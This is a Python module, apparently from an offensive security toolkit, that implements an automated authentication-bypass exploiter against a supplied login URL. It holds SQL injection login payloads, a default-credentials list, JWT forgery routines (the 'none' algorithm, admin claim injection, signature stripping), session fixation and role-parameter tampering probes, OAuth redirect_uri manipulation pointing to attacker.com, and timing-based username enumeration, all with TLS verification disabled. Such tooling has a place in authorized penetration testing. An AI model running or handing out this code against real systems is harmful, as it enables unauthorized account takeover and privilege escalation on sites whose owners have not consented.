"""
Authentication Bypass Exploit Module
Automated exploitation of authentication vulnerabilities
"""

import requests
import time
import json
import base64
import hmac
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse


class AuthBypassExploit:
    """
    Automated authentication bypass exploitation framework
    Supports SQL injection, JWT manipulation, default credentials, and more
    """

    def __init__(self, target_url: str, timeout: int = 10, delay: float = 0.5):
        """
        Initialize authentication bypass exploit

        Args:
            target_url: Target login URL
            timeout: Request timeout
            delay: Delay between attempts
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.successful_bypasses = []

    def test_sql_injection_bypass(
        self, username_field: str = "username", password_field: str = "password"
    ) -> Dict[str, Any]:
        """
        Test SQL injection authentication bypass

        Args:
            username_field: Username field name
            password_field: Password field name

        Returns:
            Test results
        """
        print("[*] Testing SQL injection authentication bypass...")

        # SQL injection payloads for auth bypass
        sqli_payloads = [
            ("admin' OR '1'='1'--", "password"),
            ("admin' OR '1'='1'#", "password"),
            ("admin' OR 1=1--", "password"),
            ("' OR '1'='1'--", "' OR '1'='1'--"),
            ("admin'--", "anything"),
            ("' OR 1=1#", "password"),
            ("' OR 'a'='a'--", "' OR 'a'='a'--"),
            ("admin' OR '1'='1'/*", "password"),
            ("' UNION SELECT 1,1,1--", "password"),
            ("admin' OR 'x'='x'--", "password"),
            ("') OR ('1'='1'--", "password"),
            ("' OR 1=1 LIMIT 1--", "password"),
            ("1' OR '1'='1", "1' OR '1'='1"),
            ("' OR ''='", "' OR ''='"),
            ("admin' AND '1'='1'--", "password"),
        ]

        results = {
            "vulnerable": False,
            "successful_payloads": [],
            "bypass_method": "sql_injection",
        }

        for username_payload, password_payload in sqli_payloads:
            credentials = {
                username_field: username_payload,
                password_field: password_payload,
            }

            bypass_result = self._attempt_login(credentials)

            if bypass_result["success"]:
                print(f"[+] SQL injection bypass successful!")
                print(f"    Username: {username_payload}")
                print(f"    Password: {password_payload}")

                results["vulnerable"] = True
                results["successful_payloads"].append(
                    {
                        "username": username_payload,
                        "password": password_payload,
                        "response": bypass_result,
                    }
                )

                self.successful_bypasses.append(
                    {
                        "method": "sql_injection",
                        "credentials": credentials,
                        "result": bypass_result,
                    }
                )

                break  # Found working bypass

            time.sleep(self.delay)

        return results

    def test_default_credentials(
        self, username_field: str = "username", password_field: str = "password"
    ) -> Dict[str, Any]:
        """
        Test common default credentials

        Args:
            username_field: Username field name
            password_field: Password field name

        Returns:
            Test results
        """
        print("[*] Testing default credentials...")

        # Common default credentials
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "12345"),
            ("admin", "admin123"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", ""),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
            ("demo", "demo"),
            ("admin", "Admin123"),
            ("admin", "P@ssw0rd"),
            ("admin", "Welcome123"),
        ]

        results = {
            "vulnerable": False,
            "successful_credentials": [],
            "bypass_method": "default_credentials",
        }

        for username, password in default_creds:
            credentials = {username_field: username, password_field: password}

            login_result = self._attempt_login(credentials)

            if login_result["success"]:
                print(f"[+] Default credentials found!")
                print(f"    Username: {username}")
                print(f"    Password: {password}")

                results["vulnerable"] = True
                results["successful_credentials"].append(
                    {"username": username, "password": password}
                )

                self.successful_bypasses.append(
                    {
                        "method": "default_credentials",
                        "credentials": credentials,
                        "result": login_result,
                    }
                )

            time.sleep(self.delay)

        return results

    def test_jwt_bypass(self, jwt_token: str) -> Dict[str, Any]:
        """
        Test JWT manipulation techniques

        Args:
            jwt_token: Original JWT token

        Returns:
            Test results with manipulated tokens
        """
        print("[*] Testing JWT bypass techniques...")

        results = {
            "vulnerable": False,
            "working_tokens": [],
            "bypass_method": "jwt_manipulation",
        }

        # Technique 1: Change algorithm to 'none'
        none_token = self._jwt_none_algorithm(jwt_token)
        if none_token:
            test_result = self._test_jwt_token(none_token)
            if test_result["valid"]:
                print("[+] JWT 'none' algorithm bypass successful!")
                results["vulnerable"] = True
                results["working_tokens"].append(
                    {
                        "technique": "none_algorithm",
                        "token": none_token,
                        "description": "Changed algorithm to none (no signature verification)",
                    }
                )

        # Technique 2: Modify claims
        modified_token = self._jwt_modify_claims(
            jwt_token, {"role": "admin", "isAdmin": True}
        )
        if modified_token:
            test_result = self._test_jwt_token(modified_token)
            if test_result["valid"]:
                print("[+] JWT claim modification successful!")
                results["vulnerable"] = True
                results["working_tokens"].append(
                    {
                        "technique": "claim_modification",
                        "token": modified_token,
                        "description": "Modified claims to admin role",
                    }
                )

        # Technique 3: Remove signature
        unsigned_token = self._jwt_remove_signature(jwt_token)
        if unsigned_token:
            test_result = self._test_jwt_token(unsigned_token)
            if test_result["valid"]:
                print("[+] JWT signature removal successful!")
                results["vulnerable"] = True
                results["working_tokens"].append(
                    {
                        "technique": "signature_removal",
                        "token": unsigned_token,
                        "description": "Removed signature completely",
                    }
                )

        return results

    def test_session_fixation(self, session_param: str = "PHPSESSID") -> Dict[str, Any]:
        """
        Test session fixation vulnerability

        Args:
            session_param: Session parameter name

        Returns:
            Test results
        """
        print("[*] Testing session fixation...")

        results = {
            "vulnerable": False,
            "fixed_session": None,
            "bypass_method": "session_fixation",
        }

        # Set custom session ID
        custom_session = "FIXED_SESSION_12345"

        # Attempt to set session
        cookies = {session_param: custom_session}

        try:
            response = self.session.get(
                self.target_url, cookies=cookies, timeout=self.timeout, verify=False
            )

            # Check if server accepted our session ID
            if session_param in response.cookies:
                returned_session = response.cookies.get(session_param)

                if returned_session == custom_session:
                    print(
                        "[+] Session fixation possible - server accepted custom session ID!"
                    )
                    results["vulnerable"] = True
                    results["fixed_session"] = custom_session

                    self.successful_bypasses.append(
                        {"method": "session_fixation", "session_id": custom_session}
                    )

        except Exception as e:
            print(f"[!] Session fixation test failed: {str(e)}")

        return results

    def test_parameter_tampering(self, login_data: Dict[str, str]) -> Dict[str, Any]:
        """
        Test parameter tampering (hidden fields, role injection, etc.)

        Args:
            login_data: Basic login data

        Returns:
            Test results
        """
        print("[*] Testing parameter tampering...")

        results = {
            "vulnerable": False,
            "successful_parameters": [],
            "bypass_method": "parameter_tampering",
        }

        # Additional parameters to inject
        tamper_params = [
            {"role": "admin"},
            {"admin": "true"},
            {"isAdmin": "1"},
            {"user_type": "administrator"},
            {"privilege": "admin"},
            {"access_level": "9999"},
            {"is_superuser": "true"},
            {"account_type": "admin"},
        ]

        for params in tamper_params:
            test_data = login_data.copy()
            test_data.update(params)

            result = self._attempt_login(test_data)

            if result["success"] and self._check_admin_access(result):
                print(f"[+] Parameter tampering successful with: {params}")
                results["vulnerable"] = True
                results["successful_parameters"].append(params)

                self.successful_bypasses.append(
                    {
                        "method": "parameter_tampering",
                        "parameters": params,
                        "result": result,
                    }
                )

            time.sleep(self.delay)

        return results

    def test_oauth_bypass(self, oauth_endpoint: str) -> Dict[str, Any]:
        """
        Test OAuth authentication bypass techniques

        Args:
            oauth_endpoint: OAuth callback/token endpoint

        Returns:
            Test results
        """
        print("[*] Testing OAuth bypass techniques...")

        results = {
            "vulnerable": False,
            "bypass_techniques": [],
            "bypass_method": "oauth",
        }

        # Test 1: Try to access callback without authentication
        try:
            response = self.session.get(
                oauth_endpoint, timeout=self.timeout, verify=False
            )
            if response.status_code == 200:
                print("[+] OAuth callback accessible without authentication!")
                results["vulnerable"] = True
                results["bypass_techniques"].append("unprotected_callback")
        except:
            pass

        # Test 2: Try redirect_uri manipulation
        test_redirects = [
            f"{oauth_endpoint}?redirect_uri=http://attacker.com",
            f"{oauth_endpoint}?redirect_uri=//attacker.com",
            f"{oauth_endpoint}?redirect_uri=http://attacker.com@legitimate.com",
        ]

        for test_url in test_redirects:
            try:
                response = self.session.get(
                    test_url, timeout=self.timeout, verify=False, allow_redirects=False
                )
                if response.status_code in [
                    301,
                    302,
                ] and "attacker.com" in response.headers.get("Location", ""):
                    print("[+] OAuth redirect_uri manipulation possible!")
                    results["vulnerable"] = True
                    results["bypass_techniques"].append("redirect_uri_manipulation")
                    break
            except:
                pass

        return results

    def test_timing_attack(
        self,
        username_field: str = "username",
        password_field: str = "password",
        test_username: str = "admin",
    ) -> Dict[str, Any]:
        """
        Test timing-based username enumeration

        Args:
            username_field: Username field name
            password_field: Password field name
            test_username: Username to test

        Returns:
            Test results
        """
        print("[*] Testing timing-based username enumeration...")

        results = {
            "vulnerable": False,
            "valid_usernames": [],
            "bypass_method": "timing_attack",
        }

        # Test with invalid username
        invalid_time = self._measure_login_time(
            username_field, password_field, "nonexistentuser12345", "wrongpassword"
        )

        # Test with potentially valid username
        valid_time = self._measure_login_time(
            username_field, password_field, test_username, "wrongpassword"
        )

        # If there's significant timing difference, username likely exists
        time_diff = abs(valid_time - invalid_time)

        if time_diff > 0.5:  # 500ms difference threshold
            print(
                f"[+] Timing attack successful - username '{test_username}' likely exists!"
            )
            print(f"    Invalid username time: {invalid_time:.3f}s")
            print(f"    Test username time: {valid_time:.3f}s")
            print(f"    Difference: {time_diff:.3f}s")

            results["vulnerable"] = True
            results["valid_usernames"].append(
                {"username": test_username, "time_difference": time_diff}
            )

        return results

    def _attempt_login(self, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        Attempt login with given credentials

        Args:
            credentials: Login credentials dict

        Returns:
            Login result
        """
        try:
            response = self.session.post(
                self.target_url,
                data=credentials,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )

            # Check for successful authentication indicators
            success_indicators = [
                response.status_code in [200, 302, 303],
                "dashboard" in response.text.lower(),
                "welcome" in response.text.lower(),
                "logout" in response.text.lower(),
                "Set-Cookie" in response.headers,
                len(response.cookies) > 0,
            ]

            # Check for failure indicators
            failure_indicators = [
                "invalid" in response.text.lower(),
                "incorrect" in response.text.lower(),
                "failed" in response.text.lower(),
                "wrong" in response.text.lower(),
            ]

            success = any(success_indicators) and not any(failure_indicators)

            return {
                "success": success,
                "status_code": response.status_code,
                "cookies": dict(response.cookies),
                "redirect": response.headers.get("Location"),
                "response_text": response.text[:500],
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _measure_login_time(
        self, username_field: str, password_field: str, username: str, password: str
    ) -> float:
        """Measure time taken for login attempt"""
        credentials = {username_field: username, password_field: password}

        start_time = time.time()
        self._attempt_login(credentials)
        end_time = time.time()

        return end_time - start_time

    def _check_admin_access(self, login_result: Dict[str, Any]) -> bool:
        """Check if login result indicates admin access"""
        if not login_result.get("success"):
            return False

        admin_indicators = ["admin", "administrator", "dashboard", "control panel"]
        response_text = login_result.get("response_text", "").lower()

        return any(indicator in response_text for indicator in admin_indicators)

    def _jwt_none_algorithm(self, token: str) -> Optional[str]:
        """Modify JWT to use 'none' algorithm"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header
            header = self._jwt_decode(parts[0])
            if not header:
                return None

            # Decode payload
            payload = self._jwt_decode(parts[1])
            if not payload:
                return None

            # Modify header to use 'none' algorithm
            header["alg"] = "none"

            # Encode modified header and payload
            new_header = self._jwt_encode(header)
            new_payload = self._jwt_encode(payload)

            # Return token without signature (empty signature)
            return f"{new_header}.{new_payload}."

        except Exception as e:
            return None

    def _jwt_modify_claims(
        self, token: str, new_claims: Dict[str, Any]
    ) -> Optional[str]:
        """Modify JWT claims"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode payload
            payload = self._jwt_decode(parts[1])
            if not payload:
                return None

            # Modify claims
            payload.update(new_claims)

            # Encode modified payload
            new_payload = self._jwt_encode(payload)

            # Return token with modified payload (keep original signature - won't validate but worth testing)
            return f"{parts[0]}.{new_payload}.{parts[2]}"

        except Exception as e:
            return None

    def _jwt_remove_signature(self, token: str) -> Optional[str]:
        """Remove JWT signature"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Return token without signature
            return f"{parts[0]}.{parts[1]}."

        except Exception as e:
            return None

    def _jwt_decode(self, encoded: str) -> Optional[Dict]:
        """Decode JWT part"""
        try:
            # Add padding if needed
            padding = 4 - len(encoded) % 4
            if padding != 4:
                encoded += "=" * padding

            decoded = base64.urlsafe_b64decode(encoded)
            return json.loads(decoded)
        except:
            return None

    def _jwt_encode(self, data: Dict) -> str:
        """Encode data as JWT part"""
        json_str = json.dumps(data, separators=(",", ":"))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
        return encoded.rstrip("=")

    def _test_jwt_token(self, token: str) -> Dict[str, Any]:
        """Test if JWT token is accepted"""
        try:
            headers = {"Authorization": f"Bearer {token}"}
            response = self.session.get(
                self.target_url, headers=headers, timeout=self.timeout, verify=False
            )

            return {
                "valid": response.status_code == 200,
                "status_code": response.status_code,
            }
        except:
            return {"valid": False}

    def execute_full_exploitation(
        self, username_field: str = "username", password_field: str = "password"
    ) -> Dict[str, Any]:
        """
        Execute full authentication bypass exploitation

        Args:
            username_field: Username field name
            password_field: Password field name

        Returns:
            Complete exploitation results
        """
        print("=" * 60)
        print("AUTHENTICATION BYPASS EXPLOITATION")
        print("=" * 60)

        results = {"success": False, "bypass_methods": [], "successful_bypasses": []}

        # Test 1: SQL Injection
        sqli_result = self.test_sql_injection_bypass(username_field, password_field)
        if sqli_result["vulnerable"]:
            results["success"] = True
            results["bypass_methods"].append("sql_injection")
            results["successful_bypasses"].extend(sqli_result["successful_payloads"])

        # Test 2: Default Credentials
        default_result = self.test_default_credentials(username_field, password_field)
        if default_result["vulnerable"]:
            results["success"] = True
            results["bypass_methods"].append("default_credentials")
            results["successful_bypasses"].extend(
                default_result["successful_credentials"]
            )

        # Test 3: Session Fixation
        session_result = self.test_session_fixation()
        if session_result["vulnerable"]:
            results["success"] = True
            results["bypass_methods"].append("session_fixation")

        # Test 4: Parameter Tampering
        basic_login = {username_field: "test", password_field: "test"}
        tamper_result = self.test_parameter_tampering(basic_login)
        if tamper_result["vulnerable"]:
            results["success"] = True
            results["bypass_methods"].append("parameter_tampering")

        print("=" * 60)
        print("EXPLOITATION COMPLETE")
        print(f"Success: {results['success']}")
        print(f"Bypass Methods Found: {len(results['bypass_methods'])}")
        print(f"Methods: {', '.join(results['bypass_methods'])}")
        print("=" * 60)

        return results

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of exploitation results"""
        return {
            "total_bypasses": len(self.successful_bypasses),
            "successful_bypasses": self.successful_bypasses,
        }
